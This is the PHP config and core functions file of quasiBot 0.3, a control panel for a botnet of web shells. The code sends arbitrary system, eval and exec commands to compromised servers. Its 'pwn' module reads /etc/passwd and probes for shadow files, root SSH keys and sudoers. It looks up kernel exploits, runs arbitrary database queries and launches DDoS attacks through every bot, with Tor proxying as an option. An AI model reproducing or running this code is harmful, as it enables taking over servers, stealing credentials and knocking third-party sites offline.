<?php

/*

quasiBot 0.3 - config file

https://github.com/Smaash/quasibot

 ~ smash[at]devilteam.pl

*/

set_time_limit(0);
error_reporting(E_ALL);

// Proxy -  Default TOR connection - 127.0.0.1:9050
define('USE_PROXY', 0); //0 - No proxy, 1 - Use proxy
define('PROXY_IP', '127.0.0.1');
define('PROXY_PORT', '9050');

// SQL Connection
define('SQL_HOST', 'localhost');
define('SQL_USER', 'root');
define('SQL_PWD', 'fuckyou');
define('SQL_DB', 'quasibot');

//Authentication, default credentials - quasi:changeme
define('AUTH_ENABLE', 1); //0 - Disable, 1 - Enable
define('AUTH_USER', 'quasi'); //Auth login
define('AUTH_PASS', '4cb9c8a8048fd02294477fcb1a41191a'); //Auth password, MD5 encrypted
define('AUTH_USECOOKIE', 0); //0 - Disable, 1 - Enable; Cookie Auth Protection
define('AUTH_COOKIE', 'secretcookie=value'); //Cookie required for Cookie Auth

//Misc
define('NMAP', '/usr/bin/nmap'); // Nmap executable for Scan module
define('CHECKSQL', 1); //Determine whenever mysql connection should be checked
define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN and Shell module


//Functions

function checksql() {
if(CHECKSQL == 1) {
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
if(!$conn) {
	die('Could not connect to sql - '.mysql_error());
} else {
if (!mysqli_select_db($conn, SQL_DB)) {
    echo('[+] Looks like you\'re running quasi for first time! Enjoy.<br />');
    echo('[+] Creating database '.SQL_DB.'<br />');
    mysqli_query($conn,'CREATE DATABASE '.SQL_DB);
    mysqli_select_db(SQL_DB);
}
if(mysqli_num_rows(mysqli_query($conn,'SHOW TABLES LIKE "bots"'))!=1) {
	echo '[+] Creating tables';
	mysqli_query($conn,'CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
    mysqli_query($conn,'CREATE TABLE brute(id MEDIUMINT NOT NULL AUTO_INCREMENT, service CHAR(50) NOT NULL, credentials CHAR(255) NOT NULL, PRIMARY KEY (id))');
}
}
mysqli_close($conn);
}
}

function auth() {

    if(AUTH_ENABLE == 1) {

    session_start();
    session_regenerate_id();

    if(!isset($_SESSION['user'])) {
        header('Location: ../index.php');
    }

    if(isset($_GET['logout'])) {
        session_start();
        unset($_SESSION['user']);
        session_destroy();
        header('Location: ../index.php');
    }

    }

    if(AUTH_USECOOKIE == 1) {
   
        $cooks = explode('=', AUTH_COOKIE);
        if($_COOKIE[$cooks[0]] != $cooks[1]) {
            die();
        }

    }

}


function conn($url) {

$ua = array('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b3) Gecko/20090305',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092816',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008090713',
'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36');
$agent = $ua[array_rand($ua)];

$ch = curl_init($url);
if(USE_PROXY == 1) {
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch,CURLOPT_USERAGENT, $agent);
//curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE); 
$response = curl_exec($ch);
return $response;

}

function showbots() {
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db($conn,SQL_DB );

$data = mysqli_query($conn,"SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
while($row = mysqli_fetch_assoc($data)) {
    
$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$status = 'OK';
} else {
$status = 'BAD';
}
if(strpos($source, md5("#666#".date("h:d")))) {
    $statdos = 'OK';
} else {
    $statdos = 'BAD';
}
    
echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
}
echo '</table>';

if(isset($_POST['addurl'])) {

if(mysqli_query($conn,"INSERT INTO bots(url) VALUES ('".mysql_escape_string($_POST['addurl'])."')"))
echo '<br/><p>Shell added - '.htmlspecialchars($_POST['addurl']).'</p>';
} 
elseif(isset($_POST['rmurl'])) {

$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false) {
if(mysqli_query($conn,"DELETE FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1"))
echo '<br/><p>Shell with id <b>'.htmlspecialchars($_POST['rmurl']).'</b> removed.</p>';
} else { echo '<br/><p>Wrong shell ID ('.$_POST['rmurl'].')</p>'; }
}
mysqli_close($conn);
}

function checkbots() {

echo 'Count - ';
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db($conn, SQL_DB);
$rows = mysqli_query($conn,'SELECT * FROM `bots`');
echo mysqli_num_rows($rows);
echo ' &nbsp;&bull;&nbsp; Current hash - '.md5("#666#".date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
echo '<table align="center"><tr><td><b>ID</b></td><td><b>URL</b></td><td><b>IP</b></td><td><b>STATUS</b></td><td><b>OS</b></td><td><b>RCE</b></td><td><b>PWN</b></td></tr>';
$id = 0;
while($row = mysqli_fetch_assoc($rows)) {


$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5("#666#".date("h:d")))) {
$status = 'OK';
$os = explode("{:|", $source);
} else {
$os[3] = 'Not connected';
$status = 'BAD';
}
$urlp = parse_url($row['url']);
echo '<tr><td>'.$row['id'].'.</td><td><a href="'.htmlspecialchars($row['url']).'">'.htmlspecialchars($row['url']).'</a></td><td><a href="http://www.whois.com/whois/'.gethostbyname($urlp["host"]).'">'.gethostbyname($urlp["host"]).'<a></td><td>'.$status.'</td><td>'.$os[3].'</td>';
if ($status == 'OK') {
	echo '<td><a href="rce.php?id='.$row['id'].'">&bull;</a></td><td><a href="pwn.php?id='.$row['id'].'">&bull;</a></td>'; }
echo '</tr>';

}
echo '</table> ';
mysqli_close($conn);

}

function mysqlm() {
    echo "<table><form action=\"\" method=\"get\" /><tr><td><b>HOST</b></td><td><b>LOGIN</b></td><td><b>PASS</b></td></tr><tr>";
    echo "<td><input type=\"text\" value='". (empty($_GET['host'])?'':htmlspecialchars($_GET['host'], ENT_QUOTES)) ."' name=\"host\" />&nbsp;</td>";
    echo "<td><input type=\"text\" value='". (empty($_GET['login'])?'':htmlspecialchars($_GET['login'], ENT_QUOTES)) ."' name=\"login\" />&nbsp;</td>";
    echo "<td><input type=\"text\" value='". (empty($_GET['pass'])?'':htmlspecialchars($_GET['pass'], ENT_QUOTES)) ."' name=\"pass\" />&nbsp;</td>";
    echo "<td><input type=\"submit\" value=\"Conn\" /></td>";
    echo "</form></tr></table>";


    if(isset($_GET['host'], $_GET['login'], $_GET['pass']) && $conn = mysql_pconnect($_GET['host'], $_GET['login'], $_GET['pass'])) {
    echo 'Connected successfully<br />...<br />';


    ob_start();
    system('mysqldump');
    $wynik = ob_get_contents();
    ob_end_clean();

    print '<br /><h2>General info</h2>';

    if(strpos($wynik, 'Usage: mysqldump [OPTIONS]')){
    print '<br /><b>Mysqldump</b> works!<br />';
    $mysqldump = 1;
    }else{
    print '<br />Mysqldump not working<br />';
    $mysqldump = 0;
    }

    $dbuser = mysqli_query($conn,"SELECT USER();");
    $dbuzer = mysql_fetch_row($dbuser);
    $dbdb = mysqli_query($conn,"SELECT DATABASE();");
    $dbd = mysql_fetch_row($dbdb);

    echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
    echo "Host info - ".mysql_get_host_info()."<br />";
    echo "Current user - ".$dbuzer[0]."<br />";
    echo "Current database - ".$dbd[0]."<br />";

    echo '<br /><h2>Databases</h2><br />';
    $res = mysqli_query($conn,"SHOW DATABASES");

    while ($row = mysqli_fetch_assoc($res)) {
        echo $row['Database'] . "<br />";
    }


    $link = mysqli_connect('localhost', 'mysql_user', 'mysql_password');
    $db_list = mysql_list_dbs($link);

    while ($row = mysql_fetch_object($db_list)) {
         echo $row->Database . "<br />";
    }


    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" name=\"db\" value=\"". (empty($_POST['db'])?"Database":htmlspecialchars($_POST['db'])) ."\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Show tables\" />";
    echo "</form>";

    if(isset($_POST['db'])) {
    $tabele = mysql_list_tables($_POST['db']);
    if (!$tabele) {
        echo '<br />An error has occurred - ' . mysql_error() ."<br />";
    }
    else {
       echo "<br /><p>Tables for <b>".$_POST['db']."</b> (".mysqli_num_rows($tabele)."):</p>";

    while ($row = mysql_fetch_row($tabele)) {
        echo ' - '.$row[0]."<br />";
    }

    mysql_free_result($result);
    }
    }


    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" name=\"baza\" value=\"". (empty($_POST['db'])?"Database":htmlspecialchars($_POST['db'])) ."\" />&nbsp;";
    echo "<input type=\"text\" name=\"tabela\" value=\"". (empty($_POST['tabela'])?"Table":htmlspecialchars($_POST['tabela'])) ."\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Show columns\" />";
    echo "</form>";

    if(isset($_POST['baza'], $_POST['tabela'])) {

    $pola = mysql_list_fields($_POST['baza'], $_POST['tabela']);
    $columns = mysql_num_fields($pola);

    echo "<br /><p>Columns for <b>".$_POST['tabela']."</b> in database <b>".$_POST['baza']."</b> (".mysql_num_fields($pola)."):</p><br />";

    for ($i = 0; $i < $columns; $i++) {
    echo ' - '.mysql_field_name($pola, $i).' ('.mysql_field_type($pola, $i).', '.mysql_field_len($pola, $i).')<br />';
    }

    }

    echo "<br />...<br />";
    echo "<br /><form action=\"\" method=\"post\" />";
    echo "<input type=\"text\" style=\"width: 250px\" name=\"query\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Execute\" />";
    echo "</form>";

     if(isset($_POST['query'])) {
     
    $result = mysqli_query($conn,$_POST['query']);
    if (!$result) {
        die('An error has occurred - ' . mysql_error());
    }
    echo "<br />";
    while ($row = mysqli_fetch_assoc($result)) {
       
        foreach ($row as $key => $value) {
            echo $row[$key]." ";
        }
       echo "<br />";
    }

    }

    mysqli_close($conn);

    } elseif(isset($_GET['host'], $_GET['login'], $_GET['pass']) && !$conn = mysql_pconnect($_GET['host'], $_GET['login'], $_GET['pass'])) {
    	echo '<p>An error occurred while connecting - ' . mysql_error().'</p>';
    }
}

function nmap($url, $args) {
    echo '<br/><h2>Nmap</h2><br/>';
    if($_POST['proxychains'] == 'yes') {
 if($ex = exec('proxychains '.NMAP.' '.escapeshellcmd($args).' '.escapeshellcmd($url), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Nmap not installed / available.<br />';
  }
} else {
 if($ex = exec(NMAP.' '.escapeshellcmd($args).' '.escapeshellcmd($url), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Nmap not installed / available.<br />';
  }
}
}

function dig($url) {
echo '<br/><h2>Dig</h2><br/>';
 if(system('dig '.escapeshellcmd(trim($url)), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo '<pre>'.$rec.'</pre><br />';
 } 
    } else {
  echo 'Dig not installed / available.<br />';
  }
}

function whois($url) {
echo '<br/><h2>Whois</h2><br/>';
if(exec('whois '.escapeshellcmd(trim($url)), $out)) {
  foreach(array_slice($out,1,count($out)) as $rec)
 {
     echo $rec.'<br />';
 } 
    } else {
  echo 'Whois not installed / available.<br />';
  }
}

function scan() {

if(isset($_POST['host']) && isset($_POST['nmap']) || isset($_POST['dig']) || isset($_POST['whois'])) {
echo '<div class="post"><h2 class="title"><a href="#">Scan results</a></h2><div class="entry">';
echo '<p class="meta">Used proxychains: ';
if($_POST['proxychains'] == 'yes') {
    echo 'Yes &nbsp;&bull;&nbsp;';
} else { echo 'No &nbsp;&bull;&nbsp;'; }
echo ' Target - '.htmlspecialchars($_POST['host']).'</p>';


if($_POST['nmap'] == 'yes') {
nmap($_POST['host'], $_POST['ncmd']);
}


if($_POST['dig'] == 'yes') {
dig($_POST['host']);
}


if($_POST['whois'] == 'yes') {
whois($_POST['host']);
}

echo '</div></div>';
}
}

function quotes() {
$quotes=array("&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;  <font size='1' color='gray'>Anthony J. D'Angelo</font>","&quot;The difference between stupidity and genius is that genius has its limits&quot;  <font size='1' color='gray'>Albert Einstein</font>","&quot;As a young boy, I was taught in high school that hacking was cool.&quot;  <font size='1' color='gray'>Kevin Mitnick</font>", "&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;  <font size='1' color='gray'>Steve Wozniak</font>","&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;  <font size='1' color='gray'>Cory Doctorow</font>", "&quot;It’s hardware that makes a machine fast. It’s software that makes a fast machine slow.&quot;  <font size='1' color='gray'>Craig Bruce</font>", "&quot;The function of good software is to make the complex appear to be simple.&quot;  <font size='1' color='gray'>Grady Booch</font>", "&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Tell me what you need and I'll tell you how to get along without it.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Hmm..&quot;  <font size='1' color='gray'>Smash</font>", "&quot;Once we accept our limits, we go beyond them.&quot; <font size='1' color='gray'>Albert Einstein</font>", "&quot;Listen to many, speak to a few.&quot; <font size='1' color='gray'>William Shakespeare</font>", "&quot;The robbed that smiles, steals something from the thief.&quot; <font size='1' color='gray'>William Shakespeare</font>");
$quote = $quotes[array_rand($quotes)];
echo '<p>'.$quote.'</p>';
}

function rce()
{
$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);
if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
$row = mysql_fetch_array($check);
if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
echo '<p class="meta">'.$row[1].'?_='.htmlspecialchars($_POST['func']).'&__='.htmlspecialchars($_POST['cmd']).'</p>';
$x = conn($row[1].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));

$y = explode("{:|", $x);
echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
} else {
echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
}
}
mysqli_close($conn);
}

function pwn() {
                        if(isset($_POST['id']) && isset($_POST['os']))
                        {

                            $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
                            mysqli_select_db(SQL_DB, $conn);
                            $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
                            $row = mysql_fetch_array($check);

                            if(isset($_POST['os']) == 'linux' && $row[1] != NULL) {

                            if(isset($_POST['info']) == 'yes') {

                                echo '</div></div><div class="post"><h2 class="title"><a href="#">Info</a></h2><div class="entry"><p class="meta"> ';
                                $v = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('whoami && echo \' - \' && id && echo \' - \' && uname -mrs'));
                                
                                $z = explode("{:|", $v);
                                echo $z[1].'&nbsp;&bull;&nbsp; <a href="'.$row[1].'?___=phpinfo">phpInfo</a></p>';
                                $files = array('/etc/motd', '/etc/passwd', '/etc/group', '/etc/resolv.conf', '/etc/hosts', '/etc/issue');
                                foreach($files as $file) {
                                    $x = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=cat%20'.$file);
                                    
                                    $y = explode("{:|", $x);
                                    echo '<br/><h3>'.$file.'</h3><br />';
                                    echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
                                }
                            }

                            if(isset($_POST['exploit']) == 'yes') {

                            echo '</div></div><div class="post"><h2 class="title"><a href="#">Exploits</a></h2><div class="entry"><p class="meta"> Looking for exploits for kernel version</p>';

                                $v = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('uname -r |cut -d"-" -f1'));
                                
                                $z = explode("{:|", $v);
                            echo '<p><a href="http://www.cvedetails.com/version-search.php?vendor=linux&product=&version='.$z[1].'"> Search for vulnerabilities ('.$z[1].')</a></p>';

                                search_exploits($z[1]);

                            echo '<br /><p><a href="http://pwnwiki.io/#!privesc/linux/index.md">More tips</a></p>';
                            }


                            //Files
                            if(isset($_POST['files']) == 'yes') {

                                echo '</div></div><div class="post"><h2 class="title"><a href="#">Files</a></h2><div class="entry"><p class="meta"> Common files for Linux system and services</p>';

$bigfiles = array('/apache/logs/access.log',
'/apache/logs/error.log',
'/bin/php.ini',
'/etc/alias',
'/etc/apache2/apache.conf',
'/etc/apache2/conf/httpd.conf',
'/etc/apache2/httpd.conf',
'/etc/apache/conf/httpd.conf',
'/etc/bash.bashrc',
'/etc/chttp.conf',
'/etc/crontab',
'/etc/crypttab',
'/etc/debian_version',
'/etc/exports',
'/etc/fedora-release',
'/etc/fstab',
'/etc/ftphosts',
'/etc/ftpusers',
'/etc/group',
'/etc/group-',
'/etc/hosts',
'/etc/http/conf/httpd.conf',
'/etc/httpd.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/etc/httpd/php.ini',
'/etc/http/httpd.conf',
'/etc/inetd.conf',
'/etc/inittab',
'/etc/issue',
'/etc/issue.net',
'/etc/lighttpd.conf',
'/etc/login.defs',
'/etc/mandrake-release',
'/etc/motd',
'/etc/mtab',
'/etc/my.cnf',
'/etc/mysql/my.cnf',
'/etc/openldap/ldap.conf',
'/etc/os-release',
'/etc/pam.conf',
'/etc/passwd',
'/etc/passwd-',
'/etc/password.master',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php5/cgi/php.ini',
'/etc/php/apache2/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/php.ini',
'/etc/profile',
'/etc/proftp.conf',
'/etc/proftpd/modules.conf',
'/etc/protpd/proftpd.conf',
'/etc/pure-ftpd.conf',
'/etc/pureftpd.passwd',
'/etc/pureftpd.pdb',
'/etc/pure-ftpd/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pure-ftpd/pureftpd.pdb',
'/etc/redhat-release',
'/etc/resolv.conf',
'/etc/samba/smb.conf',
'/etc/security/environ',
'/etc/security/group',
'/etc/security/limits',
'/etc/security/passwd',
'/etc/security/user',
'/etc/shadow',
'/etc/shadow-',
'/etc/slackware-release',
'/etc/sudoers',
'/etc/SUSE-release',
'/etc/sysctl.conf',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/vsftpd.conf',
'/etc/vsftpd/vsftpd.conf',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/logs/access.log',
'/logs/error.log',
'/opt/apache2/conf/httpd.conf',
'/opt/apache/conf/httpd.conf',
'/opt/xampp/etc/php.ini',
'/php4\php.ini',
'/php5\php.ini',
'/php\php.ini',
'/PHP\php.ini',
'/private/etc/httpd/httpd.conf',
'/private/etc/httpd/httpd.conf.default',
'/root/.bash_history',
'/root/.ssh/id_rsa',
'/root/.ssh/id_rsa.pub',
'/root/.ssh/known_hosts',
'/tmp/access.log',
'/usr/apache2/conf/httpd.conf',
'/usr/apache/conf/httpd.conf',
'/usr/etc/pure-ftpd.conf',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/lib/security/mkuser.default',
'/usr/local/apache2/conf/httpd.conf',
'/usr/local/apache2/httpd.conf',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/usr/local/apache/conf/httpd.conf',
'/usr/local/apache/conf/php.ini',
'/usr/local/apache/httpd.conf',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/usr/local/apache/logs/error. og',
'/usr/local/apps/apache2/conf/httpd.conf',
'/usr/local/apps/apache/conf/httpd.conf',
'/usr/local/etc/apache2/conf/httpd.conf',
'/usr/local/etc/apache/conf/httpd.conf',
'/usr/local/etc/apache/vhosts.conf',
'/usr/local/etc/httpd/conf/httpd.conf',
'/usr/local/etc/php.ini',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/httpd/conf/httpd.conf',
'/usr/local/lib/php.ini',
'/usr/local/php4/httpd.conf',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/httpd.conf',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php5/lib/php.ini',
'/usr/local/php/httpd.conf',
'/usr/local/php/httpd.conf.php',
'/usr/local/php/lib/php.ini',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'/usr/local/pureftpd/etc/pureftpd.pdb',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/Zend/etc/php.ini',
'/usr/pkgsrc/net/pureftpd/',
'/usr/ports/contrib/pure-ftpd/',
'/usr/ports/ftp/pure-ftpd/',
'/usr/ports/net/pure-ftpd/',
'/usr/sbin/pure-config.pl',
'/var/cpanel/cpanel.config',
'/var/lib/mysql/my.cnf',
'/var/local/www/conf/php.ini',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/messages',
'/var/log/messages.1',
'/var/log/user.log',
'/var/log/user.log.1',
'/var/www/conf/httpd.conf',
'/var/www/html/index.html',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/Volumes/webBackup/opt/apache2/conf/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf',
'/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
'/web/conf/php.ini');

                                echo '<br /><h3>Found</h3><br />';
                                foreach($bigfiles as $file) {
                                    $x = conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.urlencode('[ -f '.$file.' ] && echo "'.md5(1337).'" || echo "'.md5(7331)).'"');
                                    
                                    $y = explode("{:|", $x);
                                    if(strpos($x, md5(1337))) {
                                        echo ' - '.$file.'<br />';
                                    }
                                }
                            }

                            if(isset($_POST['misc']) == 'yes') {
                                
                                $misc = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=env');
                                $mis = explode("{:|", $misc);
                                $misc1 = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=df%20-h');
                                $mis1 = explode("{:|", $misc1);
                                $misc2 = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=ps%20lt');
                                $mis2 = explode("{:|", $misc2);
                            echo '</div></div><div class="post"><h2 class="title"><a href="#">Miscellaneous</a></h2><div class="entry"><p class="meta">The devil is in the details</p>';
                            echo '<h2>Environment</h2>';
                            echo '<pre>'.htmlspecialchars($mis[1]).'</pre>';
                            echo '<h2>HDD</h2>';
                            echo '<pre>'.htmlspecialchars($mis1[1]).'</pre>';
                            echo '<h2>Processes</h2>';
                            echo '<pre>'.htmlspecialchars($mis2[1]).'</pre>';
                            }


                        } else {
                            echo '<br /><p>Wrong shell ID.</p>';
                        }
                        }
}

function ddos() {

    if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {

$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $conn);
$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);

if($_POST['sup'] == 'kill') {
$x = 0;
while($row = mysqli_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$x++;
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'kill' => '1'
    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);
}
}
echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';

        } elseif($_POST['sup'] == 'attack') {
            $y = 0;
            while($row = mysqli_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$y++;
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url'],
        'time'   => $_POST['time']
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url'],
        'time'   => $_POST['time']
    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);
}
}
echo '<br /><p>Attacked '.$_POST['url'].' for '.$_POST['time']. ' seconds with <b>'.$y.'</b> bots.</p>';

        }

    }

}

function rss($feed) {
    $rss = new DOMDocument();
    $rss->load($feed);
    $feed = array();
    foreach ($rss->getElementsByTagName('item') as $node) {
    $item = array (
    'title' => $node->getElementsByTagName('title')->item(0)->nodeValue,
